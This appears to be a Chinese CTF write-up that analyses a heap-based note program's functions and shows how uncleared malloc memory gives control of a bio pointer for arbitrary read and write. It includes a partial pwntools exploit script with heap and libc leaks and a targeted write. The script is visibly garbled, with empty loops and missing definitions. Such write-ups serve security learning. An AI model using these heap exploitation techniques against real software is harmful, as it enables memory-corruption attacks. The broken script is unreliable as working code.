### 功能实现

#### register

`malloc`一个0x88的堆块

向+0x0处写入`ID`（0xF大小）

如果`check`发现已存在，就`free`掉0x88的堆块

如果不存在，就向`chunk`+0x10处写入`name`（0x3F大小），向读取结尾处写0

同时，向`chunk`+0x50写入`pass`（0x1F大小），向读取结尾处写0

向`notes`数组写入堆块用户指针

向当前0x88堆块末尾八字节（下一个`chunk`的`prev_size`处）写入当前`chunk`的堆地址

![upload/attach/202605/1060264_S7P7YTNGZZW86K4.png](upload/attach/202605/1060264_S7P7YTNGZZW86K4.png)

#### login

鉴权逻辑：确认存不存在`ID`

若存在，比较0x50处字符串是否相同，若相同进入`menu`

![upload/attach/202605/1060264_AC7CYKWPK8XQ8WH.png](upload/attach/202605/1060264_AC7CYKWPK8XQ8WH.png)

1.`show`，打印，但用的是`printf`，遇到`\x00`会截断

![upload/attach/202605/1060264_2K4C4JQZH48SDFG.png](upload/attach/202605/1060264_2K4C4JQZH48SDFG.png)

2.新增`bio`，输入小于0x400的`size`，若不存在已有的`bio`，则`malloc`一个并向`chunk`+0x70处写入新`malloc`的指针，向`chunk`+0x78处写入新`malloc`的`size`，并写入，末尾补0

若存在已有的`bio`且输入`size`大于已有`bio`，`free`掉原`bio`，新`malloc`一个`chunk`，逻辑同上

![upload/attach/202605/1060264_4Q9CHFHCGGDC87G.png](upload/attach/202605/1060264_4Q9CHFHCGGDC87G.png)

#### delete

输入`ID`，与`chunk`的开头校验，若校验通过，则进入`free`逻辑，首先检查0x70处是否存在指针，若存在，则先`free`0x70处的`bio`指针，再`free`当前`user_chunk`，同时清空了`notes`数组，不存在UAF漏洞

若检验不通过，则将指针后移0x80，进行遍历

## 漏洞分析

### 原语组合

这题的难点在于，所有的写入操作都在末尾处补零了，且`size`计算合理不存在off by null漏洞，`free`也伴随了正确的指针清零操作，所以常见的堆利用三板斧：UAF、堆溢出、off by null均无法正常实现，且无法通过程序读功能泄露基地址（强制写入，且写入必补零）

因此，此题并非为简单的堆利用，而是一套组合漏洞，漏洞的根源来自于当`malloc`时并未清空内存中的数据

![upload/attach/202605/1060264_WVER2V5JF9SEQSR.png](upload/attach/202605/1060264_WVER2V5JF9SEQSR.png)

这意味着，如果通过`malloc`->`edit`->`free`->`malloc`

就能控制`user`中0x70偏移的`bio`指针，再通过`user_menu`实现对于任意地址的读/写操作

    p = process(file_name)

    libc = ELF(f"{libc_position}")
assert libc is not None
sd = lambda a: p.send(a)
sl = lambda a: p.sendline(a)
rc = lambda a=4096: p.recv(a)
rl = lambda: p.recvline()
ru = lambda a: p.recvuntil(a)
uu32 = lambda a: u32(a.ljust(4, b"\x00"))
uu64 = lambda a: u64(a.ljust(8, b"\x00"))

    if not args.REMOTE:
        gdb.attach(p, cmd)

def safe(a, b):
    return p64(b ^ (a >> 12))
def choice(a):
    ru(b"> ")

def add(a, b, c):
    choice(1)
    ru(b"ID:")
    sl(str(a).encode())
    ru(b"ame")
    sd(b)
    ru(b"ass:")
    sd(c)
def delete(a):

    sl(str(a).encode())

    choice(2)
    ru(b"ID:")
    sl(str(a).encode())
    ru(b"ss:")
    sd(b)

    choice(2)

    sl(str(a).encode())

    sd(b)
    choice(2)
    ru(b"ze:")
    sl(str(c).encode())

    sd(d)
    loogout()

    choice(0)
for i in range(15):
    add(i, str(i).encode(), str(i).encode())
add(15, b"15", b"15")
add(17, b"17", b"17")
for i in range(19, 40):

for i in [14, 13, 12, 11, 10, 9, 8, 7]:

edit(17, b"17", 0x90, b"\x00")
add(18, b"18", b"18")
show(18, b"18")

slog(b"heap_base", heap_base)
loogout()
edit(19, b"19", 0xA0, b"19")
for i in range(20, 34):

for i in range(20, 27):

edit(36, b"36", 0x80, b"0" * 0x70 + p64(libc_base + 0x2044C0) + b"\x00\x10")
